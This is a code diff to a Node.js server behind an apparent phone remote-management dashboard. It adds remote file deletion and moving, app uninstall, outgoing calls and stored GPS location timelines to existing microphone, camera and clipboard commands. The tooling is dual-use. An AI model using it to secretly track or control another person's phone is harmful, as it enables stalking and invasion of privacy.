@@ -154,7 +154,15 @@ const COMMAND_EVENTS = {
   'junk-scan': 'JUNK_SCAN_REQUEST',
   'junk-clean': 'JUNK_CLEAN_COMMAND',
   'dnd-get': 'DND_GET_REQUEST',
-  'dnd-set': 'DND_SET_COMMAND'
+  'dnd-set': 'DND_SET_COMMAND',
+  'file-delete': 'FILE_DELETE_COMMAND',
+  'file-rename': 'FILE_RENAME_COMMAND',
+  'file-mkdir': 'FILE_MKDIR_COMMAND',
+  'file-move': 'FILE_MOVE_COMMAND',
+  'file-copy': 'FILE_COPY_COMMAND',
+  'uninstall-app': 'UNINSTALL_APP_COMMAND',
+  'timeline-config': 'TIMELINE_CONFIG_COMMAND',
+  'call-outgoing': 'CALL_OUTGOING_COMMAND'
 };
 
 /** Builds the phone payload for a REST command (1:1 mapping for most). */
@@ -172,7 +180,7 @@ function commandPayload(name, body = {}) {
     case 'clipboard-enable':
     case 'clipboard-disable': return { enabled: name === 'clipboard-enable' };
     case 'tts': return { text: body.text, speed: body.speed ?? 1.0, pitch: body.pitch ?? 1.0 };
-    case 'play-audio': return { url: body.url, loop: !!body.loop };
+    case 'play-audio': return { url: body.url || null, data: body.data || null, loop: !!body.loop };
     case 'wallpaper': return { url: body.url || null, color: body.color || null, data: body.data || null };
     case 'mic-record': return { durationSec: Math.max(5, Math.min(60, Number(body.durationSec) || 15)) };
     case 'camera-capture': return { facing: body.facing === 'front' ? 'front' : 'back' };
@@ -219,6 +227,14 @@ function commandPayload(name, body = {}) {
     case 'junk-clean': return { categoryId: body.categoryId || '', paths: Array.isArray(body.paths) ? body.paths : null };
     case 'dnd-get': return {};
     case 'dnd-set': return { mode: body.mode || 'OFF' };
+    case 'file-delete': return { path: body.path || '' };
+    case 'file-rename': return { path: body.path || '', newName: body.newName || '' };
+    case 'file-mkdir': return { parentPath: body.parentPath || '/', folderName: body.folderName || '' };
+    case 'file-move': return { sourcePath: body.sourcePath || '', destParentPath: body.destParentPath || '/' };
+    case 'file-copy': return { sourcePath: body.sourcePath || '', destParentPath: body.destParentPath || '/' };
+    case 'uninstall-app': return { packageName: body.packageName || '' };
+    case 'timeline-config': return { enabled: !!body.enabled, minRadiusMeters: Number(body.minRadiusMeters) || 200, dwellMinutes: Number(body.dwellMinutes) || 5 };
+    case 'call-outgoing': return { number: String(body.number || '') };
     default: return {};
   }
 }
@@ -423,21 +439,24 @@ function handleMessage(ws, msg) {
     }
 
     case 'LOCATION_UPDATE': {
-      const { deviceId, latitude, longitude, accuracy, speed, altitude, bearing, timestamp, error } = payload;
+      const { deviceId, latitude, longitude, accuracy, speed, altitude, bearing, timestamp, isTimelinePoint, error } = payload;
       if (latitude != null && longitude != null) {
-        db.data.locations.push({
-          id: randomUUID(),
-          deviceId,
-          latitude,
-          longitude,
-          accuracy,
-          speed: speed ?? null,
-          altitude: altitude ?? null,
-          bearing: bearing ?? null,
-          timestamp: timestamp || Date.now()
-        });
-        if (db.data.locations.length > 5000) db.data.locations = db.data.locations.slice(-5000);
-        db.write();
+        if (isTimelinePoint === true) {
+          db.data.locations.push({
+            id: randomUUID(),
+            deviceId,
+            latitude,
+            longitude,
+            accuracy,
+            speed: speed ?? null,
+            altitude: altitude ?? null,
+            bearing: bearing ?? null,
+            timestamp: timestamp || Date.now(),
+            isTimelinePoint: true
+          });
+          if (db.data.locations.length > 5000) db.data.locations = db.data.locations.slice(-5000);
+          db.write();
+        }
       }
       broadcastToDashboard('LOCATION_UPDATE', {
         deviceId,
@@ -448,6 +467,7 @@ function handleMessage(ws, msg) {
         altitude,
         bearing,
         timestamp: timestamp || Date.now(),
+        isTimelinePoint,
         error
       });
       break;
@@ -635,8 +655,46 @@ function handleMessage(ws, msg) {
     case 'LOST_MODE_RESULT':
     case 'LOST_MODE_STATUS':
     case 'MEDIA_GALLERY_RESPONSE':
+    case 'FILE_DELETE_RESULT':
+    case 'FILE_RENAME_RESULT':
+    case 'FILE_MKDIR_RESULT':
+    case 'FILE_MOVE_RESULT':
+    case 'FILE_COPY_RESULT':
+    case 'UNINSTALL_APP_RESULT':
+    case 'TIMELINE_CONFIG_RESULT':
+    case 'CALL_OUTGOING_RESULT':
       broadcastToDashboard(msg.event, payload);
       break;
+
+    case 'LOCATION_BATCH_UPDATE': {
+      const fixes = Array.isArray(payload.waypoints) ? payload.waypoints : (Array.isArray(payload.fixes) ? payload.fixes : (Array.isArray(payload) ? payload : []));
+      for (const fix of fixes) {
+        if (fix && fix.latitude != null && fix.longitude != null) {
+          db.data.locations.push({
+            id: randomUUID(),
+            deviceId: payload.deviceId || fix.deviceId,
+            latitude: fix.latitude,
+            longitude: fix.longitude,
+            accuracy: fix.accuracy ?? null,
+            speed: fix.speed ?? null,
+            altitude: fix.altitude ?? null,
+            bearing: fix.bearing ?? null,
+            timestamp: fix.timestamp || Date.now(),
+            isTimelinePoint: true
+          });
+        }
+      }
+      if (fixes.length > 0) {
+        if (db.data.locations.length > 5000) db.data.locations = db.data.locations.slice(-5000);
+        db.write();
+        broadcastToDashboard('LOCATION_BATCH_UPDATE', {
+          deviceId: payload.deviceId,
+          count: fixes.length,
+          waypoints: fixes
+        });
+      }
+      break;
+    }
 
     case 'CELLULAR_INFO_RESPONSE': {
       const { deviceId } = payload;
@@ -730,6 +788,14 @@ app.get('/api/devices/:id/location/history', (req, res) => {
     .filter((l) => l.deviceId === req.params.id)
     .slice(-limit);
   res.json(list);
+});
+
+app.delete('/api/devices/:id/location/history', (req, res) => {
+  const deviceId = req.params.id;
+  db.data.locations = db.data.locations.filter((l) => l.deviceId !== deviceId);
+  db.write();
+  broadcastToDashboard('LOCATIONS_CLEARED', { deviceId });
+  res.json({ success: true, message: 'Location history cleared' });
 });
 
 app.get('/api/devices/:id/notifications', (req, res) => {
